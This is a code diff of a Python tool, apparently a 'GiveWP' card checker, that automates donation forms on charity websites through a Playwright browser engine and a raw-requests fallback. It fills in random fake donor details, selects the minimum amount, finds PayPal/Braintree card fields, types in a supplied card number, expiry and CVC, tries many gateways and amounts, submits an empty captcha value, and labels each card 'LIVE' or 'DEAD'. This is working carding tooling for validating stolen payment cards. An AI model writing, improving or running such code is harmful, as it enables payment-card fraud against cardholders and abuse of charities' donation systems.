+            for sel, val in [
+                ("input[name='give_first']", first),
+                ("input[name='give_last']", last),
+                ("input[name='give_email']", email),
+                ("input[name*='first_name']", first),
+                ("input[name*='last_name']", last),
+                ("input[type='email']", email),
+            ]:
+                try:
+                    loc = frame.locator(sel).first
+                    if await loc.count() > 0 and await loc.is_visible(timeout=300):
+                        await loc.fill(val)
+                except:
+                    continue
 
-        # نبحث في كل الإطارات
+    async def _select_amount(self, page):
+        # ابدأ بحد أدنى الفورم
+        amounts = list(AMOUNTS_TO_TRY)
         for frame in page.frames:
             try:
-                fills = [
-                    ('input[name="give_first"]', first),
-                    ('input[name="give_last"]', last),
-                    ('input[name="give_email"]', email),
-                    ('input[name*="first_name"]', first),
-                    ('input[name*="last_name"]', last),
-                    ('input[type="email"]', email),
-                    ('input[name*="email"]', email),
-                ]
-                for sel, val in fills:
-                    try:
-                        loc = frame.locator(sel).first
-                        if await loc.count() > 0 and await loc.is_visible(timeout=500):
-                            await human_type(loc, val)
-                    except:
-                        continue
-            except:
-                continue
-
-    # ─────────────────────────────────────────────────────────────
-    # SELECT AMOUNT — 10 طرق
-    # ─────────────────────────────────────────────────────────────
-    async def _select_amount_smart(self, page):
-        amounts = ['1', '2', '3', '5', '10', '20', '25', '50', '100']
-
-        # نبدأ بالمبلغ الأدنى من الفورم (إن وجد)
-        for frame in page.frames:
-            try:
-                loc = frame.locator('input[name="give-form-minimum"]').first
+                loc = frame.locator("input[name='give-form-minimum']").first
                 if await loc.count() > 0:
-                    min_val = await loc.get_attribute('value')
-                    if min_val and float(min_val) > 0:
-                        amounts.insert(0, str(int(float(min_val))) if float(min_val).is_integer() else min_val)
+                    mv = await loc.get_attribute("value")
+                    if mv and float(mv) > 0:
+                        if float(mv).is_integer():
+                            amt = str(int(float(mv)))
+                        else:
+                            amt = mv
+                        if amt not in amounts:
+                            amounts.insert(0, amt)
             except:
                 pass
 
         for amt in amounts:
             for frame in page.frames:
-                result = await self._try_select_amount_in_frame(frame, amt)
-                if result:
-                    return result
+                r = await self._try_amount(frame, amt)
+                if r:
+                    return r
         return None
 
-    async def _try_select_amount_in_frame(self, frame, amt):
-        # 1. input[name="give-amount"]
+    async def _try_amount(self, frame, amt):
+        # 1. input
         try:
-            inp = frame.locator('input[name="give-amount"]').first
-            if await inp.count() > 0 and await inp.is_visible(timeout=500):
-                await human_type(inp, amt)
+            inp = frame.locator("input[name='give-amount']").first
+            if await inp.count() > 0 and await inp.is_visible(timeout=300):
+                await inp.fill(amt)
                 return amt
         except:
             pass
-
-        # 2. custom amount input
+        # 2. custom
         try:
-            inp = frame.locator('input[name="give-custom-amount"], input.give-custom-amount, input[id*="custom-amount"]').first
-            if await inp.count() > 0 and await inp.is_visible(timeout=500):
-                await human_type(inp, amt)
+            inp = frame.locator("input[name='give-custom-amount'], input.give-custom-amount, input[id*='custom-amount']").first
+            if await inp.count() > 0 and await inp.is_visible(timeout=300):
+                await inp.fill(amt)
                 return amt
         except:
             pass
-
-        # 3. button/div with data-price
-        for val in [amt, f'{amt}.00', f'{amt}.0']:
+        # 3. data-price button
+        for val in [amt, f"{amt}.00", f"{amt}.0"]:
             try:
-                el = frame.locator(f'[data-price="{val}"]').first
+                el = frame.locator(f"[data-price='{val}']").first
                 if await el.count() > 0:
                     await el.scroll_into_view_if_needed()
                     await el.click()
                     return amt
             except:
                 pass
-
-        # 4. radio input
-        for val in [amt, f'{amt}.00']:
+        # 4. radio
+        for val in [amt, f"{amt}.00"]:
             try:
-                radio = frame.locator(f'input[type="radio"][value="{val}"]').first
+                radio = frame.locator(f"input[type='radio'][value='{val}']").first
                 if await radio.count() > 0:
                     await radio.check(force=True)
                     return amt
             except:
                 pass
-
-        # 5. button with text $amt
+        # 5. button $amt
         try:
-            btn = frame.get_by_role('button', name=re.compile(rf'^\${amt}(\.00)?$')).first
+            btn = frame.get_by_role("button", name=re.compile(rf"^\${amt}(\.00)?$")).first
             if await btn.count() > 0:
                 await btn.click()
                 return amt
         except:
             pass
-
         # 6. select option
         try:
-            for sel_name in ['select[name*="amount"]', 'select[name="give-amount"]',
-                            'select.give-amount', 'select[id*="amount"]']:
-                sel = frame.locator(sel_name).first
+            for name in ["select[name*='amount']", "select[name='give-amount']",
+                         "select.give-amount", "select[id*='amount']"]:
+                sel = frame.locator(name).first
                 if await sel.count() > 0:
                     try:
                         await sel.select_option(amt)
                         return amt
                     except:
                         try:
-                            await sel.select_option(f'{amt}.00')
+                            await sel.select_option(f"{amt}.00")
                             return amt
                         except:
                             pass
         except:
             pass
-
-        # 7. link with $amt
+        # 7. link
         try:
-            link = frame.get_by_role('link', name=re.compile(rf'^\${amt}(\.00)?$')).first
+            link = frame.get_by_role("link", name=re.compile(rf"^\${amt}(\.00)?$")).first
             if await link.count() > 0:
                 await link.click()
                 return amt
         except:
             pass
-
-        # 8. clickable div/li with data-price
+        # 8. label
         try:
-            el = frame.locator(f'.give-donation-level-btn[data-price="{amt}"], li[data-price="{amt}"], div[data-price="{amt}"]').first
-            if await el.count() > 0:
-                await el.click()
+            lbl = frame.locator(f"label:has-text('${amt}')").first
+            if await lbl.count() > 0:
+                await lbl.click()
                 return amt
         except:
             pass
-
-        # 9. radio with label text $amt
-        try:
-            label = frame.locator(f'label:has-text("${amt}")').first
-            if await label.count() > 0:
-                await label.click()
-                return amt
-        except:
-            pass
-
         return None
 
-    # ─────────────────────────────────────────────────────────────
-    # FILL BILLING
-    # ─────────────────────────────────────────────────────────────
     async def _fill_billing(self, page):
         first = random.choice(FIRST_NAMES)
         last = random.choice(LAST_NAMES)
@@ -714,211 +538,179 @@ class GiveWPPlaywright:
         state = random.choice(STATES)
         zipcode = random.choice(ZIPS)
 
-        billing_map = [
-            (r'input[name*="billing"][name*="first"]', first),
-            (r'input[name*="billing"][name*="last"]', last),
-            (r'input[name*="address"]', street),
-            (r'input[name*="street"]', street),
-            (r'input[name*="city"]', city),
-            (r'input[name*="zip"]', zipcode),
-            (r'input[name*="postal"]', zipcode),
-            (r'input[name*="phone"]', '5551234567'),
-            (r'input[name*="billing_city"]', city),
-            (r'input[name*="billing_zip"]', zipcode),
-        ]
-
         for frame in page.frames:
-            for sel, val in billing_map:
+            # text inputs
+            for sel, val in [
+                ("input[name*='billing'][name*='first']", first),
+                ("input[name*='billing'][name*='last']", last),
+                ("input[name*='billing_first']", first),
+                ("input[name*='billing_last']", last),
+                ("input[name*='address']", street),
+                ("input[name*='street']", street),
+                ("input[name*='city']", city),
+                ("input[name*='zip']", zipcode),
+                ("input[name*='postal']", zipcode),
+                ("input[name*='phone']", "5551234567"),
+            ]:
                 try:
                     loc = frame.locator(sel).first
                     if await loc.count() > 0 and await loc.is_visible(timeout=300):
-                        tag = await loc.evaluate('el => el.tagName.toLowerCase()')
-                        if tag == 'select':
+                        await loc.fill(val)
+                except:
+                    continue
+
+            # selects
+            for name in ["billing_country", "mailing_country", "card_country",
+                         "give-country", "give_country"]:
+                try:
+                    loc = frame.locator(f"select[name*='{name}'], select[id*='{name}']").first
+                    if await loc.count() > 0:
+                        try:
+                            await loc.select_option("US")
+                        except:
                             try:
-                                await loc.select_option(val)
+                                await loc.select_option(index=1)
                             except:
-                                try:
-                                    await loc.select_option(index=1)
-                                except:
-                                    pass
-                        else:
-                            await human_type(loc, val)
+                                pass
+                except:
+                    continue
+            for name in ["billing_state", "mailing_state", "card_state",
+                         "give-state", "give_state"]:
+                try:
+                    loc = frame.locator(f"select[name*='{name}'], select[id*='{name}']").first
+                    if await loc.count() > 0:
+                        try:
+                            await loc.select_option(state)
+                        except:
+                            try:
+                                await loc.select_option(index=1)
+                            except:
+                                pass
                 except:
                     continue
 
-            # selects: billing_country / billing_state / card_state
-            for name in ['billing_country', 'mailing_country', 'card_country']:
-                try:
-                    loc = frame.locator(f'select[name="{name}"]').first
-                    if await loc.count() > 0:
-                        await loc.select_option('US')
-                except:
-                    continue
-            for name in ['billing_state', 'mailing_state', 'card_state']:
-                try:
-                    loc = frame.locator(f'select[name="{name}"]').first
-                    if await loc.count() > 0:
-                        await loc.select_option(state)
-                except:
-                    continue
-
-    # ─────────────────────────────────────────────────────────────
-    # FILL ALL REQUIRED (selects, radios, checkboxes, text)
-    # ─────────────────────────────────────────────────────────────
-    async def _fill_all_required(self, page):
+    async def _fill_required(self, page):
         for frame in page.frames:
             # selects
             try:
-                selects = await frame.locator('select').all()
+                selects = await frame.locator("select").all()
                 for sel in selects:
                     try:
-                        name = await sel.get_attribute('name') or ''
-                        if not name:
+                        name = await sel.get_attribute("name") or ""
+                        if any(k in name.lower() for k in ["country", "state", "billing", "mailing", "card_"]):
                             continue
-                        # تجنب selects المهمة التي ملأناها بالفعل
-                        if any(k in name.lower() for k in ['country', 'state', 'billing', 'mailing', 'card_']):
-                            continue
-                        opts = await sel.locator('option').all()
+                        # أول option صالح
+                        opts = await sel.locator("option").all()
                         valid = []
                         for opt in opts:
-                            v = await opt.get_attribute('value')
-                            if v and v not in ('', '0', '-1'):
+                            v = await opt.get_attribute("value")
+                            if v and v not in ("", "0", "-1", "placeholder"):
                                 valid.append(v)
                         if valid:
-                            await sel.select_option(valid[0])
+                            try:
+                                await sel.select_option(valid[0])
+                            except:
+                                pass
                     except:
                         continue
             except:
                 pass
 
-            # radios (non-payment)
+            # radios (skip payment-mode)
             try:
-                radios = await frame.locator('input[type="radio"]').all()
-                seen_names = set()
-                for radio in radios:
+                radios = await frame.locator("input[type='radio']").all()
+                seen = set()
+                for r in radios:
                     try:
-                        name = await radio.get_attribute('name') or ''
-                        if not name or name in seen_names:
+                        name = await r.get_attribute("name") or ""
+                        if not name or name in seen:
                             continue
-                        if 'payment-mode' in name.lower() or 'gateway' in name.lower():
+                        if any(k in name.lower() for k in ["payment-mode", "gateway"]):
                             continue
-                        # check first radio in group
-                        await radio.check(force=True)
-                        seen_names.add(name)
+                        await r.check(force=True)
+                        seen.add(name)
                     except:
                         continue
             except:
                 pass
 
-            # required text inputs
-            try:
-                req_inputs = await frame.locator('input[required], input[aria-required="true"]').all()
-                for inp in req_inputs:
-                    try:
-                        name = await inp.get_attribute('name') or ''
-                        if any(k in name.lower() for k in ['first', 'last', 'email', 'address', 'city', 'zip', 'phone']):
-                            continue  # already filled
-                        if await inp.is_visible(timeout=200):
-                            tag_type = await inp.get_attribute('type') or 'text'
-                            if tag_type in ('text', 'tel', 'number'):
-                                await human_type(inp, 'Test')
-                    except:
-                        continue
-            except:
-                pass
-
-    # ─────────────────────────────────────────────────────────────
-    # TERMS
-    # ─────────────────────────────────────────────────────────────
     async def _check_terms(self, page):
         for frame in page.frames:
             try:
                 cbs = await frame.locator(
-                    'input[type="checkbox"][name*="terms"], '
-                    'input[type="checkbox"][name*="agree"], '
-                    'input[type="checkbox"][name*="condition"], '
-                    'input[type="checkbox"][name*="accept"]'
+                    "input[type='checkbox'][name*='terms'], "
+                    "input[type='checkbox'][name*='agree'], "
+                    "input[type='checkbox'][name*='condition'], "
+                    "input[type='checkbox'][name*='accept']"
                 ).all()
                 for cb in cbs:
                     try:
                         if not await cb.is_checked():
-                            await cb.check(force=True, timeout=2000)
+                            await cb.check(force=True)
                     except:
                         try:
-                            await cb.click(force=True, timeout=2000)
+                            await cb.click(force=True)
                         except:
                             pass
             except:
                 continue
 
-    # ─────────────────────────────────────────────────────────────
-    # CLICK DONATE
-    # ─────────────────────────────────────────────────────────────
     async def _click_donate(self, page):
         selectors = [
-            'button.give-submit',
-            'input.give-submit',
-            'button[type="submit"][class*="give"]',
-            'input[type="submit"][value*="Donate" i]',
-            'button:has-text("Donate Now")',
-            'button:has-text("Donate")',
-            'button:has-text("Give Now")',
-            'button:has-text("Give")',
-            'button:has-text("Submit")',
-            'button[type="submit"]',
-            'input[type="submit"]',
+            "button.give-submit",
+            "input.give-submit",
+            "button[type='submit'][class*='give']",
+            "input[type='submit'][value*='Donate' i]",
+            "button:has-text('Donate Now')",
+            "button:has-text('Donate')",
+            "button:has-text('Give Now')",
+            "button:has-text('Give')",
+            "button:has-text('Submit')",
+            "button[type='submit']",
+            "input[type='submit']",
         ]
-
         for frame in page.frames:
             for sel in selectors:
                 try:
                     btn = frame.locator(sel).first
                     if await btn.count() > 0 and await btn.is_visible(timeout=800):
                         await btn.scroll_into_view_if_needed()
-                        await human_delay(0.3, 0.8)
+                        await asyncio.sleep(0.3)
                         try:
                             await btn.click(timeout=5000)
                         except:
                             await btn.click(force=True, timeout=5000)
-                        self.log(f'      ✅ clicked: {sel}')
+                        self.log(f"  ✅ clicked: {sel}")
                         return True
                 except:
                     continue
         return False
 
-    # ─────────────────────────────────────────────────────────────
-    # WAIT PAYPAL
-    # ─────────────────────────────────────────────────────────────
     async def _wait_paypal(self, page, timeout=25):
-        iterations = timeout * 2
-
-        for i in range(iterations):
-            # 1. frames
+        for _ in range(timeout * 2):
+            # frames
             for frame in page.frames:
                 if frame == page.main_frame:
                     continue
                 furl = frame.url.lower()
-                if any(k in furl for k in ['paypal', 'braintree', 'card-fields', 'hosted-fields']):
+                if any(k in furl for k in ["paypal", "braintree", "card-fields", "hosted-fields"]):
                     try:
-                        cnt = await frame.locator('input').count()
-                        if cnt > 0:
+                        if await frame.locator("input").count() > 0:
                             return frame
                     except:
                         continue
-
-            # 2. iframe elements
+            # iframes
             try:
-                iframes = await page.locator('iframe').all()
+                iframes = await page.locator("iframe").all()
                 for iframe in iframes:
                     try:
-                        src = await iframe.get_attribute('src') or ''
-                        title = await iframe.get_attribute('title') or ''
-                        if any(k in (src + title).lower() for k in ['paypal', 'braintree', 'card']):
+                        src = await iframe.get_attribute("src") or ""
+                        title = await iframe.get_attribute("title") or ""
+                        if any(k in (src + title).lower() for k in ["paypal", "braintree", "card"]):
                             fr = await iframe.content_frame()
                             if fr:
                                 try:
-                                    cnt = await fr.locator('input').count()
-                                    if cnt > 0:
+                                    if await fr.locator("input").count() > 0:
                                         return fr
                                 except:
                                     pass
@@ -926,29 +718,19 @@ class GiveWPPlaywright:
                         continue
             except:
                 pass
-
-            # 3. inline card form in main page
+            # inline card
             try:
-                card = page.locator(
-                    'input[autocomplete="cc-number"], '
-                    'input[name*="cardnumber"], '
-                    'input[name*="card-number"]'
-                ).first
+                card = page.locator("input[autocomplete='cc-number'], input[name*='cardnumber']").first
                 if await card.count() > 0:
                     return page
             except:
                 pass
-
             await page.wait_for_timeout(500)
-
         return None
 
-    # ─────────────────────────────────────────────────────────────
-    # FILL CARD PAYPAL
-    # ─────────────────────────────────────────────────────────────
-    async def _fill_card_paypal(self, frame, page):
+    async def _fill_card(self, frame):
         try:
-            parts = self.card.strip().split('|')
+            parts = self.card.strip().split("|")
             n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
             mm = mm.zfill(2)
             if len(yy) == 4:
@@ -956,241 +738,576 @@ class GiveWPPlaywright:
 
             await asyncio.sleep(2)
 
-            # email (PayPal قد يطلبه)
-            for sel in ['input[type="email"]', 'input[name*="email"]', 'input[id*="email"]']:
+            # email
+            for sel in ["input[type='email']", "input[name*='email']", "input[id*='email']"]:
                 try:
                     loc = frame.locator(sel).first
-                    if await loc.count() > 0 and await loc.is_visible(timeout=500):
-                        await human_type(loc, f'u{int(time.time()*1000)%999999}@gmail.com')
+                    if await loc.count() > 0 and await loc.is_visible(timeout=300):
+                        await loc.fill(f"u{int(time.time()*1000)%999999}@gmail.com")
                         break
                 except:
                     continue
 
             # card number
-            card_filled = False
-            for sel in [
-                'input#credit-card-number',
-                'input[name="cardnumber"]',
-                'input[name="card-number"]',
-                'input[name="cardNumber"]',
-                'input[autocomplete="cc-number"]',
-                'input[placeholder*="Card number" i]',
-                'input[placeholder*="Card Number" i]',
-                'input[placeholder*="card" i][type="tel"]',
-                'input[type="tel"][name*="card"]',
-                'input[data-testid*="card"]',
-            ]:
+            card_ok = False
+            for sel in ["input#credit-card-number", "input[name='cardnumber']",
+                        "input[name='card-number']", "input[name='cardNumber']",
+                        "input[autocomplete='cc-number']",
+                        "input[placeholder*='Card number' i]",
+                        "input[placeholder*='Card Number' i]",
+                        "input[type='tel'][name*='card']",
+                        "input[data-testid*='card']"]:
                 try:
                     loc = frame.locator(sel).first
                     if await loc.count() > 0:
-                        await loc.click()
-                        await human_delay(0.3, 0.7)
-                        await loc.fill('')
-                        for ch in n:
-                            await loc.type(ch, delay=random.randint(30, 80))
-                        card_filled = True
-                        self.log('      ✅ card number')
+                        await loc.fill(n)
+                        card_ok = True
+                        self.log("  ✅ card number")
                         break
                 except:
                     continue
+            if not card_ok:
+                return False
 
-            if not card_filled:
-                return {'filled': False, 'error': 'CARD_NUMBER_NOT_FOUND'}
-
-            await human_delay(0.5, 1)
+            await asyncio.sleep(0.5)
 
             # expiry
-            for sel in [
-                'input#expiration-date',
-                'input[name="exp"]',
-                'input[name="expiry"]',
-                'input[name="expiration"]',
-                'input[autocomplete="cc-exp"]',
-                'input[placeholder*="MM / YY" i]',
-                'input[placeholder*="MM/YY" i]',
-                'input[placeholder*="expiration" i]',
-                'input[placeholder*="expiry" i]',
-                'input[name*="expire"]',
-            ]:
+            for sel in ["input#expiration-date", "input[name='exp']",
+                        "input[name='expiry']", "input[name='expiration']",
+                        "input[autocomplete='cc-exp']",
+                        "input[placeholder*='MM / YY' i]",
+                        "input[placeholder*='MM/YY' i]"]:
                 try:
                     loc = frame.locator(sel).first
                     if await loc.count() > 0:
-                        await loc.click()
-                        await loc.fill('')
-                        await loc.type(f'{mm}{yy}', delay=random.randint(30, 80))
-                        self.log('      ✅ expiry')
+                        await loc.fill(f"{mm}/{yy}")
+                        self.log("  ✅ expiry")
                         break
                 except:
                     continue
 
             # cvc
-            for sel in [
-                'input#cvv',
-                'input#cvc',
-                'input[name="cvv"]',
-                'input[name="cvc"]',
-                'input[name="securityCode"]',
-                'input[autocomplete="cc-csc"]',
-                'input[placeholder*="CVV" i]',
-                'input[placeholder*="CVC" i]',
-                'input[placeholder*="security code" i]',
-            ]:
+            for sel in ["input#cvv", "input#cvc", "input[name='cvv']",
+                        "input[name='cvc']", "input[name='securityCode']",
+                        "input[autocomplete='cc-csc']",
+                        "input[placeholder*='CVV' i]",
+                        "input[placeholder*='CVC' i]"]:
                 try:
                     loc = frame.locator(sel).first
                     if await loc.count() > 0:
-                        await loc.click()
-                        await loc.fill('')
-                        await loc.type(cvc, delay=random.randint(30, 80))
-                        self.log('      ✅ cvc')
+                        await loc.fill(cvc)
+                        self.log("  ✅ cvc")
                         break
                 except:
                     continue
 
-            await human_delay(0.5, 1)
-            return {'filled': True}
+            await asyncio.sleep(0.5)
+            return True
         except Exception as e:
-            return {'filled': False, 'error': str(e)[:200]}
+            self.log(f"  ❌ card: {str(e)[:80]}")
+            return False
 
-    # ─────────────────────────────────────────────────────────────
-    # SUBMIT PAYMENT
-    # ─────────────────────────────────────────────────────────────
-    async def _submit_payment(self, frame, page):
-        selectors = [
-            'button:has-text("Pay")',
-            'button:has-text("Continue")',
-            'button:has-text("Complete")',
-            'button:has-text("Submit")',
-            'button[type="submit"]',
-            'button#btn-pay',
-            'button[id*="pay"]',
-            'button[data-testid*="pay"]',
-        ]
-        for sel in selectors:
+    async def _submit(self, frame):
+        for sel in ["button:has-text('Pay')", "button:has-text('Continue')",
+                    "button:has-text('Complete')", "button:has-text('Submit')",
+                    "button[type='submit']", "button#btn-pay", "button[id*='pay']"]:
             try:
                 btn = frame.locator(sel).first
                 if await btn.count() > 0 and await btn.is_visible(timeout=800):
                     await btn.click(timeout=5000)
-                    self.log(f'      ✅ payment submitted')
+                    self.log("  ✅ submitted")
                     return True
             except:
                 continue
         return False
 
-    # ─────────────────────────────────────────────────────────────
-    # READ FINAL RESULT
-    # ─────────────────────────────────────────────────────────────
-    async def _read_final_result(self, page, frame):
-        # 1. network responses
-        for resp in self.debug['paypal_responses']:
-            text = resp.get('body', '')
-            status, code = ResultClassifier.classify(text)
-            if status == 'LIVE' or code not in ('UNKNOWN', 'EMPTY'):
-                return {'status': status, 'code': code, 'raw': text[:500]}
+    async def _read_result(self, page, frame):
+        # 1. network
+        for r in self.debug["paypal"]:
+            st, cd = Classifier.classify(r.get("body", ""))
+            if st == "LIVE":
+                return {"status": "LIVE", "code": cd,
+                        "raw": r["body"][:500], "debug": self.debug}
 
         # 2. page text
         texts = []
         try:
             if frame:
-                texts.append(await frame.inner_text('body'))
+                texts.append(await frame.inner_text("body"))
         except:
             pass
         try:
-            texts.append(await page.inner_text('body'))
+            texts.append(await page.inner_text("body"))
         except:
             pass
 
-        for text in texts:
-            if not text:
+        for t in texts:
+            if not t:
                 continue
-            status, code = ResultClassifier.classify(text)
-            if status == 'LIVE':
-                return {'status': 'LIVE', 'code': code, 'raw': text[:500]}
+            st, cd = Classifier.classify(t)
+            if st == "LIVE":
+                return {"status": "LIVE", "code": cd, "raw": t[:500], "debug": self.debug}
 
-        # 3. alerts/errors
+        # 3. alerts
         try:
-            alerts = await page.locator('[role="alert"], .give_error, .error, .alert').all()
-            for alert in alerts:
-                t = await alert.inner_text()
-                if t:
-                    status, code = ResultClassifier.classify(t)
-                    return {'status': status, 'code': code, 'raw': t[:500]}
+            alerts = await page.locator("[role='alert'], .give_error, .error, .alert").all()
+            for a in alerts:
+                at = await a.inner_text()
+                if at:
+                    st, cd = Classifier.classify(at)
+                    return {"status": st, "code": cd, "raw": at[:500], "debug": self.debug}
         except:
             pass
 
-        # 4. unknown
-        return {'status': 'UNKNOWN', 'code': 'NO_RESPONSE',
-                'raw': (texts[0] if texts else '')[:500]}
+        return {"status": "UNKNOWN", "code": "NO_RESPONSE",
+                "raw": (texts[0] if texts else "")[:500], "debug": self.debug}
 
 
-# ═══════════════════════════════════════════════════════════════════
-# RUNNER
-# ═══════════════════════════════════════════════════════════════════
-async def test_sites(card, sites):
-    print('=' * 70)
-    print('🔥 GiveWP Playwright Ultimate v20')
-    print('=' * 70)
-    print(f'💳 {card}')
-    print(f'🌐 {len(sites)} sites')
-    print('=' * 70)
+# ═══════════════════════════════════════════════════════════════
+# REQUESTS ENGINE (Fallback — Site-first)
+# ═══════════════════════════════════════════════════════════════
+class RequestsEngine:
+    def __init__(self, url, card, verbose=False):
+        self.url = url
+        self.card = card
+        self.verbose = verbose
+        self.r = requests.Session()
+        self.r.verify = False
 
-    summary = []
-    for name, url in sites:
-        print(f'\n{"━" * 70}\n🌐 {name}\n{"━" * 70}')
-        start = time.time()
+        p = urlparse(url)
+        self.host = p.netloc
+        self.path = p.path + ("?" + p.query if p.query else "")
+        self.base = f"https://{self.host}"
+
+        self.form_id1 = None
+        self.form_id2 = None
+        self.nonce = None
+        self.min_amount = None
+        self.access_token = None
+        self.ajax_url = f"{self.base}/wp-admin/admin-ajax.php"
+        self.fields = {}
+        self.levels = []
+        self.gateways = []
+        self.has_captcha = False
+
+        self.debug = {"steps": [], "attempts": [], "raw": []}
+
+    def log(self, m):
+        if self.verbose:
+            print(m)
+        self.debug["steps"].append(m)
+
+    def _get_page(self):
         try:
-            eng = GiveWPPlaywright(url, card, verbose=True, screenshots=False)
-            result = await eng.run()
-            elapsed = time.time() - start
-            icon = '✅' if result['status'] == 'LIVE' else '❌'
-            print(f'\n  {icon} {result["status"]} | {result["code"]} ({elapsed:.1f}s)')
-            if result.get('raw'):
-                print(f'     raw: {result["raw"][:250]}')
-            print(f'     amount={result["debug"].get("amount_selected")} '
-                  f'| paypal={result["debug"].get("paypal_frame")} '
-                  f'| card={result["debug"].get("card_filled")} '
-                  f'| captcha={result["debug"].get("captcha_detected")}')
-            summary.append((name, result['status'], result['code'], elapsed,
-                           result['debug'].get('captcha_detected')))
+            r = self.r.get(self.url, headers={"user-agent": random_ua()},
+                          timeout=30, cookies=self.r.cookies)
+            html = r.text or ""
+            if len(html) < 100:
+                return ""
+            if "give-form-id-prefix" not in html or "give-form-hash" not in html:
+                for pat in [
+                    r'<iframe[^>]*src="(https?://[^"]*give/\d+[^"]*)"',
+                    r'<iframe[^>]*src="([^"]*givewp[^"]*)"',
+                    r'<iframe[^>]*src="([^"]*donation[^"]*)"',
+                ]:
+                    m = re.search(pat, html, re.IGNORECASE)
+                    if m:
+                        iurl = m.group(1)
+                        if iurl.startswith("//"): iurl = "https:" + iurl
+                        elif iurl.startswith("/"): iurl = f"{self.base}{iurl}"
+                        r2 = self.r.get(iurl, headers={"user-agent": random_ua()},
+                                       timeout=25, cookies=self.r.cookies)
+                        self.r.cookies.update(r2.cookies)
+                        html = r2.text or ""
+                        break
+            return html
+        except:
+            return ""
+
+    def _extract(self, html):
+        m = re.search(r'name="give-form-id-prefix"\s*value="([^"]*)"', html)
+        if m: self.form_id1 = m.group(1)
+        m = re.search(r'name="give-form-id"\s*value="([^"]*)"', html)
+        if m: self.form_id2 = m.group(1)
+        m = re.search(r'name="give-form-hash"\s*value="([^"]*)"', html)
+        if m: self.nonce = m.group(1)
+        m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
+        if m and m.group(1).strip(): self.min_amount = m.group(1).strip()
+
+        # hidden
+        for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html):
+            tag = m.group(0)
+            n = re.search(r'name=["\']([^"\']+)["\']', tag)
+            v = re.search(r'value=["\']([^"\']*)["\']', tag)
+            if n:
+                self.fields[n.group(1)] = v.group(1) if v else ""
+
+        # selects
+        for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', html, re.DOTALL):
+            name = m.group(1)
+            opts = re.findall(r'<option[^>]*value=["\']([^"\']*)["\']', m.group(2))
+            valid = [o for o in opts if o and o not in ("", "0", "-1")]
+            if valid:
+                self.fields[name] = valid[0]
+
+        # checkboxes
+        for m in re.finditer(r'<input[^>]*type=["\']checkbox["\'][^>]*>', html):
+            tag = m.group(0)
+            n = re.search(r'name=["\']([^"\']+)["\']', tag)
+            if n and any(k in n.group(1).lower() for k in ["terms", "agree", "accept"]):
+                self.fields[n.group(1)] = "on"
+
+        # levels
+        for pat, pg, ag in [
+            (r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', 1, 2),
+            (r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', 2, 1),
+        ]:
+            for m in re.finditer(pat, html):
+                try: self.levels.append((m.group(pg), m.group(ag)))
+                except: pass
+
+        # gateways
+        for m in re.finditer(r'name=["\']give-gateway["\'][^>]*value=["\']([^"\']+)["\']', html):
+            self.gateways.append(m.group(1))
+
+        # captcha
+        if "g-recaptcha" in html or "hcaptcha" in html:
+            self.has_captcha = True
+
+        # token
+        for pat in [r'"data-client-token"\s*:\s*"([^"]+)"',
+                    r'"accessToken"\s*:\s*"([^"]{20,})"']:
+            m = re.search(pat, html)
+            if m:
+                try:
+                    enc = m.group(1)
+                    if "client-token" in pat:
+                        dec = __import__("base64").b64decode(enc).decode("utf-8", errors="ignore")
+                        au = re.search(r'"accessToken":"([^"]+)"', dec)
+                        if au: self.access_token = au.group(1)
+                    else:
+                        self.access_token = enc
+                except:
+                    pass
+
+        return bool(self.form_id1 and self.nonce)
+
+    def _build(self, gw, amt, pid, include_amt=True):
+        base = {
+            "give-honeypot": "",
+            "give-form-id-prefix": self.form_id1 or "",
+            "give-form-id": self.form_id2 or "",
+            "give-form-title": "",
+            "give-current-url": self.url,
+            "give-form-url": self.url,
+            "give-form-minimum": self.min_amount or "",
+            "give-form-maximum": "999999.99",
+            "give-form-hash": self.nonce or "",
+            "give-price-id": pid,
+            "payment-mode": gw,
+            "give_first": "Test",
+            "give_last": "Bot",
+            "give_email": f"user{random.randint(1000,99999)}@gmail.com",
+            "card_name": "Test Bot",
+            "give-gateway": gw,
+        }
+        if include_amt:
+            base["give-amount"] = amt
+        for k, v in self.fields.items():
+            if k not in base:
+                base[k] = v
+        if self.has_captcha:
+            base["g-recaptcha-response"] = ""
+        return MultipartEncoder({k: (None, v) for k, v in base.items()})
+
+    def charge(self):
+        result = {"status": "DEAD", "code": "UNKNOWN", "raw": "", "debug": self.debug}
+
+        html = self._get_page()
+        if not html:
+            result["code"] = "GET_FAILED"
+            return result
+
+        if not self._extract(html):
+            result["code"] = "FORM_NOT_FOUND"
+            return result
+
+        # تركيبات
+        attempts = []
+        for pid, amt in self.levels:
+            attempts.append((pid, amt, True, f"level={pid}=${amt}"))
+        if self.min_amount:
+            attempts.append(("custom", self.min_amount, True, f"custom+min={self.min_amount}"))
+        for a in AMOUNTS_TO_TRY[:4]:
+            attempts.append(("custom", a, True, f"custom+{a}"))
+        attempts.append(("custom", "", True, "empty"))
+
+        gateways = self.gateways or GATEWAYS_TO_TRY
+
+        for gw in gateways:
+            for pid, amt, inc, label in attempts:
+                self.log(f"[site] {gw}/{label}")
+                data = self._build(gw, amt, pid, inc)
+                headers = {
+                    "content-type": data.content_type,
+                    "origin": self.base,
+                    "referer": self.url,
+                    "user-agent": random_ua(),
+                    "x-requested-with": "XMLHttpRequest",
+                }
+                try:
+                    r = self.r.post(self.ajax_url,
+                                   params={"action": "give_process_donation"},
+                                   headers=headers, data=data,
+                                   cookies=self.r.cookies, timeout=25)
+                    self.debug["attempts"].append({
+                        "gw": gw, "amt": amt, "pid": pid,
+                        "status": r.status_code, "body": r.text[:1000],
+                    })
+                    st, cd = Classifier.classify(r.text)
+                    if st == "LIVE":
+                        result["status"] = "LIVE"
+                        result["code"] = cd
+                        result["raw"] = r.text[:1000]
+                        return result
+                    if cd in ("GATEWAY_DISABLED", "CAPTCHA"):
+                        break
+                except Exception as e:
+                    self.log(f"  err: {str(e)[:60]}")
+                    continue
+
+        if self.debug["attempts"]:
+            result["raw"] = self.debug["attempts"][-1]["body"][:1000]
+        return result
+
+
+# ═══════════════════════════════════════════════════════════════
+# UNIFIED CHECKER
